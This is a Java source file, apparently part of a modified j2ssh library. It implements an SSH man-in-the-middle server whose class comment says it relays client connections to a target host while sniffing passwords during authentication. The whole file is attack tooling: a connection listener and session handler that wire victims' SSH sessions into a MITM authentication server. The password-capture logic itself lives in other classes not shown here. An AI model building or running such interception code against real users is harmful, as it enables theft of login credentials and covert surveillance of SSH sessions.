/*
 * Created on Mar 1, 2003
 *
 */
package com.sshtools.j2ssh;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Iterator;
import java.util.List;
import java.util.Vector;

import org.apache.log4j.Logger;

import com.sshtools.j2ssh.authentication.AuthenticationProtocolServer;
import com.sshtools.j2ssh.authentication.AuthenticationProtocolState;
import com.sshtools.j2ssh.authentication.MitmAuthenticationProtocolServer;
import com.sshtools.j2ssh.authentication.PasswordAuthenticationClient;
import com.sshtools.j2ssh.configuration.ConfigurationLoader;
import com.sshtools.j2ssh.configuration.ServerConfiguration;
import com.sshtools.j2ssh.configuration.SshConnectionProperties;
import com.sshtools.j2ssh.connection.ConnectionProtocol;
import com.sshtools.j2ssh.forwarding.ForwardingServer;
import com.sshtools.j2ssh.session.MitmSessionChannelFactory;
import com.sshtools.j2ssh.session.SessionChannelClient;
import com.sshtools.j2ssh.transport.TransportProtocolServer;
import com.sshtools.j2ssh.transport.TransportProtocolState;
import com.sshtools.j2ssh.util.StartStopState;

/**
 * @author David G&uuml;mbel<br>
 * created 01 March 2003<br>
 * This class extends <code>SshServer</code> and listens for connections that will be
 * looped through to the remote target host, thereby sniffing passwords
 * during the authentication phase of the mitm attack.
 *
 * 
 */
public class MitmServer extends SshServer {
	private static Logger log = Logger.getLogger(MitmServer.class);
	private static ServerConfiguration config =
		ConfigurationLoader.getServerConfiguration();
	private MitmConnectionListener listener = null;
	private ServerSocket server = null;
	private boolean shutdown = false;

	//public  MitmClient mitmclient = new MitmClient(this);
	private PasswordAuthenticationClient pwd =
		new PasswordAuthenticationClient();
	private SshConnectionProperties properties = new SshConnectionProperties();
	private SessionChannelClient session;

	private String username = "";
	private char[] password;

	private SessionChannelClient scc = null;
	private InputStream in;
	private OutputStream out;
	private InputStream stderr;


	/**
	 * Constructs new <code>MitmServer</code> with an initialized <code>MitmGlue</code> object attached.
	 * The <code>MitmGlue</code> object will be <code>clone()</code>d when needed, i.e. with every new connection.
	 * @param mg the MitmGlue object
	 * @throws SshException
	 */
	public MitmServer(MitmGlue mg) throws SshException {
		super();
		ConfigurationLoader.initialize();

		/* mitm: set target host's name and port */
		properties.setHost(mg.getHostname());
		properties.setPort(mg.getPort());

		/* start listening for connections and commands */
		startServerSocket(mg);
		startCommandSocket();

	}

	/**
	 *  Starts a server socket that waits for SSH client requests
	 * which are going to be transparently forwarded during the
	 * mitm attack.
	 * @param mg	the MitmGlue object
	 */
	protected void startServerSocket(MitmGlue mg) {
		listener =
			new MitmConnectionListener(
				config.getListenAddress(),
				config.getPort(),
				mg);
		listener.start();
	}


	/**
	 *  This class implements a listener that listens on an address and port for
	 *  client connections. For each connection the listener creates a <code>MitmConnectedSession</code>
	 *  instance. If the maximum number of connections has been reached the
	 *  connection is still made but immedialty sends a disconnect with too many
	 *  connections reason.
	 * It is largely based on SshServer.ConnectionListener by Lee David Painter.
	 *
	 *@author     <A HREF="mailto:lee@sshtools.com">Lee David Painter</A>
	 *@author	  David G&uuml;mbel
	 *@created    20 December 2002, 03 March 2003
	 */
	class MitmConnectionListener implements Runnable {
		private List activeConnections = new Vector();
		private Logger log = Logger.getLogger(MitmConnectionListener.class);
		private ServerSocket server;
		private String listenAddress;
		private Thread thread;
		private int maxConnections;
		private int port;
		private StartStopState state =
			new StartStopState(StartStopState.STOPPED);
		private MitmGlue mg;
		

		/**
			*  Creates a new MitmConnectionListener object.
			*
			*@param  listenAddress  the address to bind to
			*@param  port           the port to bind to
			*@param  mg	MitmGlue object
			*/
		public MitmConnectionListener(
			String listenAddress,
			int port,
			MitmGlue mg) {
			//super(listenAddress, port);
			log.debug("mitm: new MitmConnectionListener created");
			this.port = port;
			this.listenAddress = listenAddress;
			this.mg = mg;
		}
		
		/**
		 *  Starts the connection listener
		 */
		public void start() {
		  thread = new SshThread(this, "Connection listener", true);
		  thread.start();
		}

			/**
			*  Starts the server socket and listens for connections
			*/
		public void run() {
			try {
				log.debug("Starting connection listener thread");

				state.setValue(StartStopState.STARTED);

				server = new ServerSocket(port);

				Socket socket;
				maxConnections = config.getMaxConnections();
				boolean refuse = false;

				while ((socket = server.accept()) != null
					&& state.getValue() == StartStopState.STARTED) {
					log.debug("New connection requested");

					MitmConnectedSession session =
						new MitmConnectedSession(
							socket,
							!(maxConnections > activeConnections.size()
								|| maxConnections == 0),
							this,
							this.mg);
				}

				stop();

				log.info("Exiting connection listener thread");
			} catch (IOException ioe) {
				if (state.getValue() != StartStopState.STOPPED) {
					log.debug("The listening socket failed", ioe);
				}
			} finally {

				thread = null;
			}
		}
		
		/**
		 *  Gets a list of the active connections
		 *
		 *@return    a List of <code>MitmConnectedSession</code>
		 */
		public List getActiveConnections() {
		  return activeConnections;
		}
		
		/**
		 * Adds an active session.
		 * @param session
		 */
		public synchronized void addActiveSession(MitmConnectedSession session) {
			log.info(
				"Monitoring active session from "
					+ session.socket.getInetAddress().getCanonicalHostName());
			activeConnections.add(session);
		}
		
		/**
		 * Removes an active session.
		 * @param session
		 */
		public synchronized void removeActiveSession(MitmConnectedSession session) {
			log.info(
				session.socket.getInetAddress().getHostName()
					+ " has disconnected");
			activeConnections.remove(session);
		}

		/**
			*  Stops the connection listener
			*/
		public void stop() {
			try {

				state.setValue(StartStopState.STOPPED);

				server.close();

				// Close all the connected sessions
				Iterator it = activeConnections.iterator();

				while (it.hasNext()) {
					MitmConnectedSession session =
						(MitmConnectedSession) it.next();
					session.shutdown();
				}

			} catch (IOException ioe) {
				log.warn("The listening socket failed to stop cleanly", ioe);
			}
		}
	}
	/**
	 *  This class implements a connected session thread to track each
	 *  connection made to the MITM server. It is largely based on <code>SshServer.ConnectedSession</code>
	 * by Lee David Painter.
	 *
	 *@author     <A HREF="mailto:lee@sshtools.com">Lee David Painter</A>
	 *@author 	  David Guembel
	 */
	class MitmConnectedSession implements Runnable{
		private MitmAuthenticationProtocolServer authentication;
		private ConnectionProtocol connection;
		private ForwardingServer forwarding;
		private Logger log = Logger.getLogger(MitmConnectedSession.class);
		private Socket socket;
		private Thread thread;
		private TransportProtocolServer transport;
		private boolean refuse;
		private MitmConnectionListener listener;
		private MitmGlue mg;

		/**
		 *  Creates a new MitmConnectedSession object.
		 *
		 *@param  socket  the connected socket
		 *@param  refuse  <tt>true</tt> if the connection is to negotiate the
		 *      protocol version and refuse the connection otherwise<tt>false
		 *      </tt>
		 */
		public MitmConnectedSession(
			Socket socket,
			boolean refuse,
			MitmConnectionListener listener,
			MitmGlue mg)
			throws IOException {
			//super(socket, refuse, (SshServer.ConnectionListener) listener);
			log.debug(
				"mitm: new MitmConnectedSession created by "
					+ super.toString());

			this.socket = socket;
			this.thread = new SshThread(this, "Connected session", true);
			this.refuse = refuse;
			this.listener = listener;
			this.transport = new TransportProtocolServer(refuse);
			this.mg = mg;
			thread.start();
		}
		
		/**
		 *  Gets the state of the connection
		 *
		 *@return    the connection's state
		 */
		public TransportProtocolState getState() {
			return transport.getState();
		}

		

		/**
		 *  Attaches the connected socket to a <code>TransportProtocolServer</code>
		 *  instance and allows the session and port forwarding channels to be
		 *  requested by the client.
		 */
		public void run() {
			try {
				log.debug("Initializing connection");

				InetAddress address =
					((InetSocketAddress) socket.getRemoteSocketAddress())
						.getAddress();

				log.debug("Remote Hostname: " + address.getHostName());
				log.debug("Remote IP: " + address.getHostAddress());

				// Create the Authentication Protocol
				log.debug(
					"mitm: about to create new MitmAuthentcationProtocolServer");
				authentication = new MitmAuthenticationProtocolServer(mg);

				// Create the Connection Protocol
				connection = new ConnectionProtocol();
				log.debug(
					"mitm: about to create new MitmSessionChannelFactory");
				connection.allowChannelOpen(new MitmSessionChannelFactory(mg));

				forwarding = new ForwardingServer(connection);

				// Allow the Connection Protocol to be accepted by the Authentication Protocol
				authentication.acceptService(connection);

				// Allow the Authentication Protocol to be accepted by the Transport Protocol
				transport.acceptService(authentication);

				listener.addActiveSession(this);

				transport.startTransportProtocol(
					socket,
					new SshConnectionProperties());

				transport.getState().waitForState(
					TransportProtocolState.DISCONNECTED);

				thread = null;

			} catch (IOException e) {
				if (!refuse)
					log.error("The session failed to initialize", e);
			} finally {
				log.debug("mitm: removing active session");
				listener.removeActiveSession(this);
			}
		}
		


		/**
		 *  Shuts the connection
		 */
		public void shutdown() {
			transport.disconnect("The server is shutting down");
		}
	}
	

}
